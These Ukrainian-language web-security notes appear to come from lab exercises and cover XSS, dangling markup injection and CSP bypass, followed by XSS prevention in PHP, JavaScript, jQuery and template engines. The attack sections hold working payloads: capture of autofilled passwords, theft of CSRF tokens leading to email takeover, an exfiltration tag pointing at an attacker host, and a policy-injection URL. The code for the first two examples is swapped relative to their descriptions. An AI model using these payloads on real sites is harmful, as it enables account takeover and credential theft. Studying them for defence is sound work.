Сьогодні багато користувачів використовують **менеджери паролів**, які **автоматично підставляють паролі**. Цим можна скористатися, **створивши поле введення пароля**, зчитавши **автоматично заповнений пароль** і **відправивши його на власний домен** зловмисника. Така техніка дозволяє уникнути більшості проблем, пов’язаних із крадіжкою cookies, і навіть може дати доступ до **всіх інших акаунтів**, де жертва використала той самий пароль.

Основний недолік цього методу полягає в тому, що він працює **лише для користувачів, у яких є менеджер паролів із функцією автозаповнення**. (Звісно, якщо у користувача пароль не збережений, усе ще можна спробувати отримати його за допомогою **фішингової атаки прямо на сайті**, але це вже не зовсім те саме.)

Приклад експлоїта:
```
<input type="text" name="username">
<input type="password" name="password" onchange="hax()">

<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;


var data = new FormData
data.append('csrf', token);
data.append('email', 'evilhacker@hacker.com');


fetch('/my-account/change-email', {
   method: 'POST',
   mode: 'no-cors',
   body: data
  });
});
</script>
```
Чимось схоже на попереднє але тут жертва повинна сама ввести дані акаунту.

## Exploiting cross-site scripting to bypass CSRF protections

**XSS дозволяє зловмиснику робити майже все те саме, що й легітимний користувач на вебсайті.** Виконуючи довільний JavaScript у браузері жертви, XSS дає змогу виконувати широкий спектр дій так, ніби ви є цією жертвою. Наприклад, можна змусити жертву надіслати повідомлення, прийняти запит у друзі, додати бекдор у репозиторій із вихідним кодом або переказати біткоїни.

Деякі сайти дозволяють залогіненим користувачам **змінювати адресу електронної пошти без повторного введення пароля**. Якщо на такому сайті знайдена XSS‑вразливість, її можна використати для **крадіжки CSRF‑токена**. Маючи цей токен, можна змінити email жертви на той, який контролює зловмисник. Після цього можна **ініціювати скидання пароля** та отримати доступ до акаунта.

Такий тип експлойту поєднує **XSS (для крадіжки CSRF‑токена)** з функціональністю, на яку зазвичай націлений **CSRF**. Якщо традиційний CSRF - це **«одностороння» вразливість**, де зловмисник може змусити жертву надсилати запити, але не бачить відповідей, то **XSS забезпечує «двосторонню» взаємодію**. Це дозволяє зловмиснику не лише надсилати довільні запити, а й **читати відповіді**, що призводить до гібридної атаки, яка **обходить механізми захисту від CSRF**.

Приклад експлоїта:
```
<script>
function hax() {

var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;

var data = new FormData
data.append('csrf', token);
data.append('postId', 7);
data.append('comment', `${username}:${password}`);
data.append('name', 'hacker');
data.append('email', 'a@a');
data.append('website', 'http://www.home.com');

fetch('/post/comment', {
   method: 'POST',
   mode: 'no-cors',
   body: data
  });
}
</script>
```
Чимось схоже на два попередні, тільки тут нам потрібні тільки два поля.

# Dangling markup injection

## What is dangling markup injection?

**Dangling markup injection** — це техніка перехоплення даних **між доменами** у ситуаціях, коли **повноцінну XSS-атаку виконати неможливо**.

Припустимо, що застосунок **небезпечним чином вставляє керовані зловмисником дані у свої відповіді**:
```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```
Також припустимо, що застосунок **не фільтрує і не екранує символи `>` або `"`**. У такому випадку зловмисник може використати наступний синтаксис, щоб **вийти з лапок значення атрибуту та закрити тег**, повернувшись у HTML-контекст:
```
">
```
У цій ситуації зловмисник зазвичай намагався б виконати XSS. Але припустімо, що **звичайна XSS-атака неможлива** через фільтри введення, **Content Security Policy (CSP)** або інші обмеження. У такому разі все ще може бути можливим провести **dangling markup injection** за допомогою такого payload:
```
"><img src='//attacker-website.com?
```
Цей payload створює тег `<img>` і задає початок атрибуту `src`, який містить URL на сервері зловмисника. Зверніть увагу, що payload **не закриває атрибут `src`**, тобто він залишається «висячим» (dangling).

Коли браузер парсить відповідь, він буде шукати **наступну одинарну лапку**, щоб завершити атрибут. **Усе до цього символу** буде вважатися частиною URL і буде **надіслано на сервер зловмисника як рядок запиту**. Усі неалфавітно-цифрові символи, включно з переходами на новий рядок, будуть **URL-кодуватися**.

Наслідком такої атаки є те, що зловмисник може **перехопити частину відповіді застосунку після точки ін’єкції**, яка може містити **чутливі дані**. Залежно від функціональності застосунку, це можуть бути **CSRF-токени, email-повідомлення або фінансова інформація**.

Будь-який атрибут, який **виконує зовнішній запит**, може бути використаний для dangling markup-атаки. Приклад експлуатації:
```
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

} else {
    // If no CSRF token is present, redirect the browser to a crafted URL
    // that injects a button which sends the CSRF token to the exploit server
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
**Цей скрипт краде CSRF-токен і змінює email жертви на email зловмисника**, навіть якщо прямий XSS недоступний. Це **dangling markup + CSRF-bypass + auto-submit форма**.
# Content security policy

## What is CSP (content security policy)?

**CSP (Content Security Policy)** - це механізм безпеки браузера, який призначений для зменшення ризику **XSS** та деяких інших атак.  
Він працює так: **обмежує**, які ресурси сторінка може завантажувати (наприклад, скрипти, зображення), а також **чи може сторінка бути вбудована (iframe)** в інші сторінки.

Щоб увімкнути CSP, сервер має додати до HTTP-відповіді заголовок:

`Content-Security-Policy`

Значення цього заголовка і є **політикою безпеки**.  
Політика складається з **одного або кількох директив**, які розділяються **крапкою з комою (`;`)**.

## Bypassing CSP with policy injection

Можна зіткнутися з вебсайтом, який відображає введені дані безпосередньо в самій політиці CSP, найчастіше в директиві **`report-uri`**. Якщо сайт відображає параметр, яким ти можеш керувати, ти можеш вставити **крапку з комою (`;`)**, щоб додати власні директиви CSP. Зазвичай директива `report-uri` є останньою у списку. Це означає, що тобі потрібно **перезаписати існуючі директиви**, щоб скористатися цією вразливістю та обійти політику.

Зазвичай **неможливо перезаписати** вже існуючу директиву **`script-src`**. Однак нещодавно Chrome запровадив директиву **`script-src-elem`**, яка дозволяє керувати script-елементами, але не обробниками подій. Важливо те, що ця нова директива **дозволяє перезаписувати існуючі директиви `script-src`**.
Приклад експлоїта: 
```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

декодована версія 
https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'

```
Вразливість працює тому, що сайт **небезпечно підставляє значення параметра `token` прямо в заголовок Content-Security-Policy**. Завдяки цьому можна вставити крапку з комою `;` і **додати власну CSP-директиву**. У твоєму прикладі через `token` інʼєктується `script-src-elem 'unsafe-inline'`, яка браузером сприймається як окрема легальна директива політики безпеки.

Директива `script-src-elem` має пріоритет над `script-src` і **дозволяє виконання інлайнових `<script>` тегів**, якщо вказано `'unsafe-inline'`. Тому, коли параметр `search` відображається на сторінці у вигляді `<script>alert(1)</script>`, браузер більше не блокує його, і JavaScript виконується — XSS успішно спрацьовує.

## Protecting against clickjacking using CSP

Наступна директива дозволяє вбудовувати сторінку у фрейми **лише зі свого ж домену**:

`frame-ancestors 'self'`

Наступна директива **повністю забороняє** вбудовування сторінки у фрейми:

`frame-ancestors 'none'`

Використання **Content Security Policy (CSP)** для захисту від атак clickjacking є більш гнучким, ніж заголовок **X-Frame-Options**, оскільки CSP дозволяє вказувати **кілька доменів** та використовувати **wildcard-и**. Наприклад:

`frame-ancestors 'self' https://normal-website.com https://*.robust-website.com`

Крім того, CSP перевіряє **кожен фрейм у всьому ланцюжку батьківських фреймів**, тоді як `X-Frame-Options` перевіряє лише **верхній (top-level) фрейм**.

Використання CSP для захисту від clickjacking **рекомендується**. Також його можна комбінувати із заголовком `X-Frame-Options`, щоб забезпечити захист у **старих браузерах**, які не підтримують CSP, наприклад **Internet Explorer**.

# How to prevent XSS

## Encode data on output

Кодування слід застосовувати **безпосередньо перед тим**, як дані, контрольовані користувачем, записуються на сторінку, тому що **контекст**, у який ви їх вставляєте, визначає, **який саме тип кодування потрібно використовувати**. Наприклад, значення всередині **JavaScript-рядка** потребують іншого екранування, ніж дані в **HTML-контексті**.

В **HTML-контексті** всі значення, що не входять до білого списку, слід перетворювати на **HTML-сутності**:
```
<  перетворюється на: &lt;
>  перетворюється на: &gt;
```
У **JavaScript-рядковому контексті** всі неалфавітно-цифрові символи слід екранувати за допомогою **Unicode**:
```
<  перетворюється на: \u003c
>  перетворюється на: \u003e
```
Іноді потрібно застосовувати **декілька рівнів кодування**, причому **в правильному порядку**. Наприклад, щоб безпечно вставити введені користувачем дані всередину **обробника подій**, потрібно врахувати **і JavaScript-контекст, і HTML-контекст**. Тому спочатку потрібно виконати **Unicode-екранування**, а потім **HTML-кодування**:
```
<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
```
## Validate input on arrival

Кодування є, мабуть, **найважливішою лінією захисту від XSS**, але **саме по собі воно не є достатнім**, щоб запобігти XSS-вразливостям у всіх контекстах. Також слід **якомога суворіше перевіряти введені дані** в момент, коли вони вперше надходять від користувача.

Приклади перевірки введених даних (input validation):

- Якщо користувач надсилає URL, який потім буде відображений у відповіді, потрібно перевіряти, що він починається з безпечного протоколу, наприклад **HTTP або HTTPS**. Інакше хтось може зловживати вашим сайтом, використовуючи небезпечні протоколи на кшталт **javascript** або **data**.
    
- Якщо від користувача очікується **числове значення**, слід перевіряти, що воно дійсно містить ціле число.
    
- Перевіряти, що введені дані містять **лише очікуваний набір символів**.
    

В ідеалі перевірка введення має працювати шляхом **блокування некоректних даних**. Альтернативний підхід — намагатися “очистити” неправильні дані, щоб зробити їх коректними — є більш схильним до помилок і його варто уникати, де це можливо.

### Whitelisting vs blacklisting

Перевірка введених даних зазвичай має ґрунтуватися на **білих списках**, а не на чорних. Наприклад, замість того щоб намагатися скласти список усіх небезпечних протоколів (javascript, data тощо), краще створити список **дозволених протоколів** (HTTP, HTTPS) і забороняти все, чого в цьому списку немає.

Такий підхід гарантує, що захист не зламається з появою нових небезпечних протоколів і буде менш вразливим до атак, які намагаються **замаскувати шкідливі значення**, щоб обійти чорний список.
## Allowing "safe" HTML

Дозволяти користувачам публікувати **HTML-розмітку** слід уникати за будь-якої можливості, але іноді це є **бізнес-вимогою**. Наприклад, сайт із блогом може дозволяти залишати коментарі, що містять обмежену HTML-розмітку.

Класичний підхід полягає у спробі **відфільтрувати потенційно небезпечні теги та JavaScript**. Це можна реалізувати за допомогою **білого списку безпечних тегів і атрибутів**, але через відмінності в рушіях парсингу браузерів і такі особливості, як **mutation XSS**, цей підхід надзвичайно складно реалізувати безпечно.

Найменш поганим варіантом є використання **JavaScript-бібліотеки**, яка виконує фільтрацію та кодування в браузері користувача, наприклад **DOMPurify**. Інші бібліотеки дозволяють користувачам вводити контент у форматі **Markdown** і потім перетворюють його в HTML. На жаль, усі такі бібліотеки час від часу мають **XSS-вразливості**, тому це не ідеальне рішення. Якщо ви використовуєте подібну бібліотеку, необхідно **ретельно стежити за оновленнями безпеки**.

## How to prevent XSS using a template engine

Багато сучасних вебсайтів використовують **серверні шаблонізатори**, такі як **Twig** і **Freemarker**, щоб вбудовувати динамічний контент у HTML. Зазвичай вони мають **власну систему екранування (escaping)**. Наприклад, у Twig можна використати фільтр `e()` з аргументом, який визначає контекст:

`{{ user.firstname | e('html') }}`

Деякі інші шаблонні рушії, такі як **Jinja** та **React**, **екранують динамічний контент за замовчуванням**, що фактично запобігає більшості випадків XSS.

Ми рекомендуємо **уважно перевіряти механізми екранування**, коли ви оцінюєте, чи варто використовувати певний шаблонний рушій або фреймворк.

## How to prevent XSS in PHP

У **PHP** є вбудована функція для кодування HTML-сутностей — `htmlentities`. Цю функцію слід викликати, щоб **екранувати дані**, коли вони вставляються в **HTML-контекст**. Функцію слід викликати з трьома аргументами:

1. Ваш рядок введення.
    
2. `ENT_QUOTES` — прапорець, який вказує кодувати **всі лапки**.
    
3. Набір символів, зазвичай **UTF-8**.
    
Наприклад:

`<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>`

---

Коли дані вставляються у **JavaScript-рядок**, їх потрібно **Unicode-екранувати**, як описувалося раніше. На жаль, PHP **не має вбудованої функції** для цього, але можна реалізувати власну. Наприклад:

```
<?php
function jsEscape($str) {
    $output = '';
    $str = str_split($str);
    for($i=0;$i<count($str);$i++) {
        $chrNum = ord($str[$i]);
        $chr = $str[$i];
        if($chrNum === 226) {
            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
                    $output .= '\u2028';
                    $i += 2;
                    continue;
                }
                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
                    $output .= '\u2029';
                    $i += 2;
                    continue;
                }
            }
        }
        switch($chr) {
            case "'":
            case '"':
            case "\n";
            case "\r";
            case "&";
            case "\\";
            case "<":
            case ">":
                $output .= sprintf("\\u%04x", $chrNum);
                break;
            default:
                $output .= $str[$i];
                break;
        }
    }
    return $output;
}
?>
```
Використання цієї функції у PHP виглядає так:
```
<script>
x = '<?php echo jsEscape($_GET['x'])?>';
</script>

```
**Альтернатива:** можна використати **шаблонний рушій (template engine)**, який автоматично екранує дані для відповідного контексту.

## How to prevent XSS client-side in JavaScript

Щоб **екранувати користувацьке введення в HTML‑контексті за допомогою JavaScript**, потрібен власний HTML‑енкодер, оскільки JavaScript **не має вбудованого API** для HTML‑кодування. Нижче наведено приклад JavaScript‑коду, який перетворює рядок на HTML‑сутності:
```
function htmlEncode(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '&#'+c.charCodeAt(0)+';';
    });
}
```
Використовувати цю функцію можна так:
```
<script>
document.body.innerHTML = htmlEncode(untrustedValue)
</script>
```
Якщо ж введені дані знаходяться **всередині JavaScript‑рядка**, потрібен енкодер, який виконує **Unicode‑екранування**. Ось приклад такого Unicode‑енкодера:
```
function jsEscape(str){
    return String(str).replace(/[^\w. ]/gi, function(c){
        return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
    });
}
```
Використання виглядає так:
```
<script>
document.write('<script>x="'+jsEscape(untrustedValue)+'";<\/script>')
</script>
```
## How to prevent XSS in jQuery

Найпоширенішою формою XSS у **jQuery** є ситуація, коли **користувацьке введення передається безпосередньо в jQuery‑селектор**. Раніше веб‑розробники часто використовували `location.hash` і передавали його в селектор, що призводило до XSS, оскільки jQuery **інтерпретував введення як HTML і рендерив його**.

jQuery усвідомив цю проблему та **виправив логіку селекторів**: тепер бібліотека перевіряє, **чи починається введення з символу `#`**. У сучасних версіях jQuery HTML буде відрендерено **лише в тому випадку, якщо перший символ - `<`**.

Якщо ви передаєте **недовірені дані** в jQuery‑селектор, обов’язково потрібно **коректно екранувати значення**, наприклад, використовуючи функцію `jsEscape`, описану вище.
